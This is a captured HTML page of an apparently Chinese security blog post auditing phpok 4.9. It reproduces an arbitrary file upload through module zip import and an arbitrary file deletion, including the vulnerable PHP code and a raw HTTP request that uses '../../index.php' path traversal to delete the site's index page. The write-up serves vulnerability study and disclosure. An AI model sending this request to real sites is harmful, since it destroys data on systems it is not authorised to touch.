@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>phpok 4.9代码审计(每周一洞) - F0rmat的博客 | 专注于网络攻防和信息安全</title>
+
+<meta name="description" content="0x01 前言 一放暑假就特别多事情，很多事情都耽误了，看吐司文章看到一篇不错的审计文章，就学习下。
+0x02 环境搭建 环境没什么要求PHPstudy就能搞定，这个要先创建数据库再安装程序的。
+0x03 任意文件上传漏洞 漏洞复现  登录后台，点击模块管理   新建一个测试文件然后压缩  然后导入模块 可以看到已经上传到了/data/cache/的目录下面了：  访问文件   漏洞分析 漏洞代码在framework/admin/modulec_control.php 642行。 大家可以详细的分析这个流程，主要漏洞的代码是 $this-&amp;gt;lib(&#39;phpzip&#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,$this-&amp;gt;dir_root.&#39;data/cache/&#39;); 没有做任何的过滤，直接把zip原样解压缩到/data/cache/的目录下面。
+/** * 模块导入 * @变量 zipfile 指定的ZIP文件地址 **/ public function import_f() { $zipfile = $this-&amp;gt;get(&amp;#39;zipfile&amp;#39;); if(!$zipfile){ $this-&amp;gt;lib(&amp;#39;form&amp;#39;)-&amp;gt;cssjs(array(&amp;#39;form_type&amp;#39;=&amp;gt;&amp;#39;upload&amp;#39;)); $this-&amp;gt;addjs(&amp;#39;js/webuploader/admin.upload.js&amp;#39;); $this-&amp;gt;view(&amp;#39;module_import&amp;#39;); } if(strpos($zipfile,&amp;#39;..&amp;#39;) !== false){ $this-&amp;gt;error(P_Lang(&amp;#39;不支持带..上级路径&amp;#39;)); } if(!file_exists($this-&amp;gt;dir_root.$zipfile)){ $this-&amp;gt;error(P_Lang(&amp;#39;ZIP文件不存在&amp;#39;)); } $this-&amp;gt;lib(&amp;#39;phpzip&amp;#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,$this-&amp;gt;dir_root.&amp;#39;data/cache/&amp;#39;); if(!file_exists($this-&amp;gt;dir_root.&amp;#39;data/cache/module.xml&amp;#39;)){ $this-&amp;gt;error(P_Lang(&amp;#39;导入模块失败，请检查解压缩是否成功&amp;#39;)); } $rs = $info = $this-&amp;gt;lib(&amp;#39;xml&amp;#39;)-&amp;gt;read($this-&amp;gt;dir_root.&amp;#39;data/cache/module.xml&amp;#39;,true); if(!$rs){ $this-&amp;gt;error(P_Lang(&amp;#39;XML内容解析异常&amp;#39;)); } $tmp = $rs; if(isset($tmp[&amp;#39;_fields&amp;#39;])){ unset($tmp[&amp;#39;_fields&amp;#39;]); } $insert_id = $this-&amp;gt;model(&amp;#39;module&amp;#39;)-&amp;gt;save($tmp); if(!" /><meta name="keywords"
+  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+
+
+<link rel="stylesheet" href="https://getshe11.com/css/main.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">
+
+
+
+<meta property="og:title" content="phpok 4.9代码审计(每周一洞)" />
+<meta property="og:description" content="0x01 前言 一放暑假就特别多事情，很多事情都耽误了，看吐司文章看到一篇不错的审计文章，就学习下。
+0x02 环境搭建 环境没什么要求PHPstudy就能搞定，这个要先创建数据库再安装程序的。
+0x03 任意文件上传漏洞 漏洞复现  登录后台，点击模块管理   新建一个测试文件然后压缩  然后导入模块 可以看到已经上传到了/data/cache/的目录下面了：  访问文件   漏洞分析 漏洞代码在framework/admin/modulec_control.php 642行。 大家可以详细的分析这个流程，主要漏洞的代码是 $this-&gt;lib(&#39;phpzip&#39;)-&gt;unzip($this-&gt;dir_root.$zipfile,$this-&gt;dir_root.&#39;data/cache/&#39;); 没有做任何的过滤，直接把zip原样解压缩到/data/cache/的目录下面。
+/** * 模块导入 * @变量 zipfile 指定的ZIP文件地址 **/ public function import_f() { $zipfile = $this-&gt;get(&#39;zipfile&#39;); if(!$zipfile){ $this-&gt;lib(&#39;form&#39;)-&gt;cssjs(array(&#39;form_type&#39;=&gt;&#39;upload&#39;)); $this-&gt;addjs(&#39;js/webuploader/admin.upload.js&#39;); $this-&gt;view(&#39;module_import&#39;); } if(strpos($zipfile,&#39;..&#39;) !== false){ $this-&gt;error(P_Lang(&#39;不支持带..上级路径&#39;)); } if(!file_exists($this-&gt;dir_root.$zipfile)){ $this-&gt;error(P_Lang(&#39;ZIP文件不存在&#39;)); } $this-&gt;lib(&#39;phpzip&#39;)-&gt;unzip($this-&gt;dir_root.$zipfile,$this-&gt;dir_root.&#39;data/cache/&#39;); if(!file_exists($this-&gt;dir_root.&#39;data/cache/module.xml&#39;)){ $this-&gt;error(P_Lang(&#39;导入模块失败，请检查解压缩是否成功&#39;)); } $rs = $info = $this-&gt;lib(&#39;xml&#39;)-&gt;read($this-&gt;dir_root.&#39;data/cache/module.xml&#39;,true); if(!$rs){ $this-&gt;error(P_Lang(&#39;XML内容解析异常&#39;)); } $tmp = $rs; if(isset($tmp[&#39;_fields&#39;])){ unset($tmp[&#39;_fields&#39;]); } $insert_id = $this-&gt;model(&#39;module&#39;)-&gt;save($tmp); if(!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://getshe11.com/post/phpok-4.9-code-audit/" />
+<meta property="article:published_time" content="2018-08-05T14:54:07+00:00" />
+<meta property="article:modified_time" content="2018-08-05T14:54:07+00:00" />
+<meta itemprop="name" content="phpok 4.9代码审计(每周一洞)">
+<meta itemprop="description" content="0x01 前言 一放暑假就特别多事情，很多事情都耽误了，看吐司文章看到一篇不错的审计文章，就学习下。
+0x02 环境搭建 环境没什么要求PHPstudy就能搞定，这个要先创建数据库再安装程序的。
+0x03 任意文件上传漏洞 漏洞复现  登录后台，点击模块管理   新建一个测试文件然后压缩  然后导入模块 可以看到已经上传到了/data/cache/的目录下面了：  访问文件   漏洞分析 漏洞代码在framework/admin/modulec_control.php 642行。 大家可以详细的分析这个流程，主要漏洞的代码是 $this-&gt;lib(&#39;phpzip&#39;)-&gt;unzip($this-&gt;dir_root.$zipfile,$this-&gt;dir_root.&#39;data/cache/&#39;); 没有做任何的过滤，直接把zip原样解压缩到/data/cache/的目录下面。
+/** * 模块导入 * @变量 zipfile 指定的ZIP文件地址 **/ public function import_f() { $zipfile = $this-&gt;get(&#39;zipfile&#39;); if(!$zipfile){ $this-&gt;lib(&#39;form&#39;)-&gt;cssjs(array(&#39;form_type&#39;=&gt;&#39;upload&#39;)); $this-&gt;addjs(&#39;js/webuploader/admin.upload.js&#39;); $this-&gt;view(&#39;module_import&#39;); } if(strpos($zipfile,&#39;..&#39;) !== false){ $this-&gt;error(P_Lang(&#39;不支持带..上级路径&#39;)); } if(!file_exists($this-&gt;dir_root.$zipfile)){ $this-&gt;error(P_Lang(&#39;ZIP文件不存在&#39;)); } $this-&gt;lib(&#39;phpzip&#39;)-&gt;unzip($this-&gt;dir_root.$zipfile,$this-&gt;dir_root.&#39;data/cache/&#39;); if(!file_exists($this-&gt;dir_root.&#39;data/cache/module.xml&#39;)){ $this-&gt;error(P_Lang(&#39;导入模块失败，请检查解压缩是否成功&#39;)); } $rs = $info = $this-&gt;lib(&#39;xml&#39;)-&gt;read($this-&gt;dir_root.&#39;data/cache/module.xml&#39;,true); if(!$rs){ $this-&gt;error(P_Lang(&#39;XML内容解析异常&#39;)); } $tmp = $rs; if(isset($tmp[&#39;_fields&#39;])){ unset($tmp[&#39;_fields&#39;]); } $insert_id = $this-&gt;model(&#39;module&#39;)-&gt;save($tmp); if(!">
+<meta itemprop="datePublished" content="2018-08-05T14:54:07+00:00" />
+<meta itemprop="dateModified" content="2018-08-05T14:54:07+00:00" />
+<meta itemprop="wordCount" content="216">
+
+
+
+<meta itemprop="keywords" content="漏洞,代码审计,php,phpok,每周一洞," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="phpok 4.9代码审计(每周一洞)"/>
+<meta name="twitter:description" content="0x01 前言 一放暑假就特别多事情，很多事情都耽误了，看吐司文章看到一篇不错的审计文章，就学习下。
+0x02 环境搭建 环境没什么要求PHPstudy就能搞定，这个要先创建数据库再安装程序的。
+0x03 任意文件上传漏洞 漏洞复现  登录后台，点击模块管理   新建一个测试文件然后压缩  然后导入模块 可以看到已经上传到了/data/cache/的目录下面了：  访问文件   漏洞分析 漏洞代码在framework/admin/modulec_control.php 642行。 大家可以详细的分析这个流程，主要漏洞的代码是 $this-&gt;lib(&#39;phpzip&#39;)-&gt;unzip($this-&gt;dir_root.$zipfile,$this-&gt;dir_root.&#39;data/cache/&#39;); 没有做任何的过滤，直接把zip原样解压缩到/data/cache/的目录下面。
+/** * 模块导入 * @变量 zipfile 指定的ZIP文件地址 **/ public function import_f() { $zipfile = $this-&gt;get(&#39;zipfile&#39;); if(!$zipfile){ $this-&gt;lib(&#39;form&#39;)-&gt;cssjs(array(&#39;form_type&#39;=&gt;&#39;upload&#39;)); $this-&gt;addjs(&#39;js/webuploader/admin.upload.js&#39;); $this-&gt;view(&#39;module_import&#39;); } if(strpos($zipfile,&#39;..&#39;) !== false){ $this-&gt;error(P_Lang(&#39;不支持带..上级路径&#39;)); } if(!file_exists($this-&gt;dir_root.$zipfile)){ $this-&gt;error(P_Lang(&#39;ZIP文件不存在&#39;)); } $this-&gt;lib(&#39;phpzip&#39;)-&gt;unzip($this-&gt;dir_root.$zipfile,$this-&gt;dir_root.&#39;data/cache/&#39;); if(!file_exists($this-&gt;dir_root.&#39;data/cache/module.xml&#39;)){ $this-&gt;error(P_Lang(&#39;导入模块失败，请检查解压缩是否成功&#39;)); } $rs = $info = $this-&gt;lib(&#39;xml&#39;)-&gt;read($this-&gt;dir_root.&#39;data/cache/module.xml&#39;,true); if(!$rs){ $this-&gt;error(P_Lang(&#39;XML内容解析异常&#39;)); } $tmp = $rs; if(isset($tmp[&#39;_fields&#39;])){ unset($tmp[&#39;_fields&#39;]); } $insert_id = $this-&gt;model(&#39;module&#39;)-&gt;save($tmp); if(!"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body>
+    <div class="header-placeholder"></div>
+    
+    <header class="header">
+        <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    
+    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
+    
+    <nav class="site-nav">
+        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
+    </nav>
+</div>
+
+    </header>
+
+    
+    <div class="page-content">
+        <div class="wrapper">
+            
+            <div class="col-main">
+                <div class="post">
+    
+    <header class="post-header">
+        <h1 class="post-title">Phpok 4.9代码审计(每周一洞)</h1>
+        <p class="post-meta">Aug 05, 2018</p>
+    </header>
+    <article class="post-content">
+        
+        
+        
+        
+        
+        
+        <h1 id="0x01-前言">0x01 前言</h1>
+<p>一放暑假就特别多事情，很多事情都耽误了，看吐司文章看到一篇不错的审计文章，就学习下。</p>
+<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
+<p>环境没什么要求PHPstudy就能搞定，这个要先创建数据库再安装程序的。</p>
+<h1 id="0x03-任意文件上传漏洞">0x03 任意文件上传漏洞</h1>
+<h2 id="漏洞复现">漏洞复现</h2>
+<ol>
+<li>登录后台，点击模块管理
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/1.png" alt=""></li>
+</ol>
+<!-- raw HTML omitted -->
+<ol start="2">
+<li>新建一个测试文件然后压缩
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/2.png" alt=""></li>
+<li>然后导入模块
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/3.png" alt="">
+可以看到已经上传到了/data/cache/的目录下面了：
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/4.png" alt=""></li>
+<li>访问文件
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/5.png" alt=""></li>
+</ol>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>漏洞代码在<code>framework/admin/modulec_control.php</code> 642行。
+大家可以详细的分析这个流程，主要漏洞的代码是
+<code>$this-&gt;lib('phpzip')-&gt;unzip($this-&gt;dir_root.$zipfile,$this-&gt;dir_root.'data/cache/');</code>
+没有做任何的过滤，直接把zip原样解压缩到/data/cache/的目录下面。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">	<span class="sd">/**
+</span><span class="sd">	 * 模块导入
+</span><span class="sd">	 * @变量 zipfile 指定的ZIP文件地址
+</span><span class="sd">	**/</span>
+	<span class="k">public</span> <span class="k">function</span> <span class="nf">import_f</span><span class="p">()</span>
+	<span class="p">{</span>
+		<span class="nv">$zipfile</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;zipfile&#39;</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$zipfile</span><span class="p">){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lib</span><span class="p">(</span><span class="s1">&#39;form&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">cssjs</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;form_type&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;upload&#39;</span><span class="p">));</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addjs</span><span class="p">(</span><span class="s1">&#39;js/webuploader/admin.upload.js&#39;</span><span class="p">);</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">view</span><span class="p">(</span><span class="s1">&#39;module_import&#39;</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="k">if</span><span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$zipfile</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;不支持带..上级路径&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dir_root</span><span class="o">.</span><span class="nv">$zipfile</span><span class="p">)){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;ZIP文件不存在&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lib</span><span class="p">(</span><span class="s1">&#39;phpzip&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">unzip</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dir_root</span><span class="o">.</span><span class="nv">$zipfile</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dir_root</span><span class="o">.</span><span class="s1">&#39;data/cache/&#39;</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dir_root</span><span class="o">.</span><span class="s1">&#39;data/cache/module.xml&#39;</span><span class="p">)){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;导入模块失败，请检查解压缩是否成功&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="nv">$rs</span> <span class="o">=</span> <span class="nv">$info</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lib</span><span class="p">(</span><span class="s1">&#39;xml&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dir_root</span><span class="o">.</span><span class="s1">&#39;data/cache/module.xml&#39;</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$rs</span><span class="p">){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;XML内容解析异常&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$rs</span><span class="p">;</span>
+		<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">[</span><span class="s1">&#39;_fields&#39;</span><span class="p">])){</span>
+			<span class="nx">unset</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">[</span><span class="s1">&#39;_fields&#39;</span><span class="p">]);</span>
+		<span class="p">}</span>
+		
+		<span class="nv">$insert_id</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">&#39;module&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$insert_id</span><span class="p">){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;模块导入失败，保存模块基本信息错误&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">&#39;module&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">create_tbl</span><span class="p">(</span><span class="nv">$insert_id</span><span class="p">);</span>
+		<span class="nv">$tbl_exists</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">&#39;module&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">chk_tbl_exists</span><span class="p">(</span><span class="nv">$insert_id</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">[</span><span class="s1">&#39;mtype&#39;</span><span class="p">]);</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$tbl_exists</span><span class="p">){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">&#39;module&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">delete</span><span class="p">(</span><span class="nv">$insert_id</span><span class="p">);</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;创建模块表失败&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="s1">&#39;_fields&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$rs</span><span class="p">[</span><span class="s1">&#39;_fields&#39;</span><span class="p">]){</span>
+			<span class="k">foreach</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="s1">&#39;_fields&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">){</span>
+				<span class="k">if</span><span class="p">(</span><span class="nv">$value</span><span class="p">[</span><span class="s1">&#39;ext&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">[</span><span class="s1">&#39;ext&#39;</span><span class="p">])){</span>
+					<span class="nv">$value</span><span class="p">[</span><span class="s1">&#39;ext&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$value</span><span class="p">[</span><span class="s1">&#39;ext&#39;</span><span class="p">]);</span>
+				<span class="p">}</span>
+				<span class="nv">$value</span><span class="p">[</span><span class="s1">&#39;module_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$insert_id</span><span class="p">;</span>
+				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">&#39;module&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">fields_save</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">&#39;module&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">create_fields</span><span class="p">(</span><span class="nv">$value</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lib</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">rm</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dir_cache</span><span class="o">.</span><span class="s1">&#39;module.xml&#39;</span><span class="p">);</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lib</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">rm</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dir_root</span><span class="o">.</span><span class="nv">$zipfile</span><span class="p">);</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">success</span><span class="p">();</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><h1 id="0x04-任意文件删除">0x04 任意文件删除</h1>
+<h2 id="漏洞复现-1">漏洞复现</h2>
+<ol>
+<li>在设置-&gt;风格管理
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/6.png" alt=""></li>
+<li>点击文件管理
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/7.png" alt=""></li>
+<li>随便删除一个文件，点击抓包
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/8.png" alt=""></li>
+<li>改包发包，删除index.php文件</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">GET /admin.php?c=tpl&amp;f=delfile&amp;id=1&amp;folder=%2F&amp;title=../../index.php&amp;_=1533453756715 HTTP/1.1
+Host: sb.com
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+request_type: ajax
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+Referer: http://sb.com/admin.php?c=tpl&amp;f=list&amp;id=1
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: hd_sid=aZY7Qf; hd_auth=f0c7B2JXp7hhumOhqeqELbZ5FJA3C%2FW2AKt4di3duYf1l5T%2BbkCMPFkWus2WrHfUg2Z8np8oM4VygPGWolgu; PHPSESSION=tlcm8fq4vhio5gkh5l1f5156i3
+Connection: close
+</code></pre></div><ol start="5">
+<li>文件已删除，网站主页不能访问
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/9.png" alt=""></li>
+</ol>
+<h2 id="漏洞分析-1">漏洞分析</h2>
+<p>漏洞文件位置在于<code>framework/admin/tpl_control.php</code>的297行
+$file虽然是由几个参数拼接而成的，但是加上../../就可以回到任何位置，造成了任意文件删除的漏洞。</p>
+<p><code>$file = $this-&gt;dir_root.&quot;tpl/&quot;.$rs[&quot;folder&quot;].$folder.$title;</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">	 * 删除文件（夹）
+</span><span class="sd">	**/</span>
+	<span class="k">public</span> <span class="k">function</span> <span class="nf">delfile_f</span><span class="p">()</span>
+	<span class="p">{</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">popedom</span><span class="p">[</span><span class="s2">&#34;filelist&#34;</span><span class="p">]){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;您没有权限执行此操作&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">,</span><span class="s2">&#34;int&#34;</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$id</span><span class="p">){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;未指定风格ID&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="nv">$rs</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">&#39;tpl&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">get_one</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$rs</span><span class="p">){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;风格信息不存在&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$rs</span><span class="p">[</span><span class="s2">&#34;folder&#34;</span><span class="p">]){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;未设置风格文件夹&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="nv">$folder</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s2">&#34;folder&#34;</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$folder</span><span class="p">){</span>
+			<span class="nv">$folder</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="nv">$title</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s2">&#34;title&#34;</span><span class="p">);</span>
+		<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dir_root</span><span class="o">.</span><span class="s2">&#34;tpl/&#34;</span><span class="o">.</span><span class="nv">$rs</span><span class="p">[</span><span class="s2">&#34;folder&#34;</span><span class="p">]</span><span class="o">.</span><span class="nv">$folder</span><span class="o">.</span><span class="nv">$title</span><span class="p">;</span>
+		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="nx">P_Lang</span><span class="p">(</span><span class="s1">&#39;文件（夹）不存在&#39;</span><span class="p">));</span>
+		<span class="p">}</span>
+		<span class="k">if</span><span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lib</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">rm</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&#34;folder&#34;</span><span class="p">);</span>
+		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lib</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">rm</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">success</span><span class="p">();</span>
+	<span class="p">}</span>
+</code></pre></div><h1 id="0x05-结束">0x05 结束</h1>
+<p>虽然说这个漏洞很简单，但是这个程序能申请CVE，这也提醒我们无论是什么大程序都会存在很明显的漏洞。</p>
+<h1 id="0x06-参考">0x06 参考</h1>
+<p>程序下载：https://www.lanzous.com/i1ksjkd
+<a href="https://www.t00ls.net/viewthread.php?tid=46682">https://www.t00ls.net/viewthread.php?tid=46682</a></p>
+
+    </article>
+
+    
+    <div class="prevnext">
+        
+
+
+
+<ul class="prevnext">
+    
+    <li>上一篇：
+        <a href="https://getshe11.com/post/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/">
+            DedeCMS V5.7后台过滤不当导致Getshell(每周一洞)
+        </a>
+    </li>
+    
+    
+    <li>下一篇：
+        <a href="https://getshe11.com/post/phpok4.9-background-getshell/">
+            Phpok4.9后台getshell(每周一洞)
+        </a>
+    </li>
+    
+</ul>
+
+    </div>
+    
+    <div class="post-comments">
+        
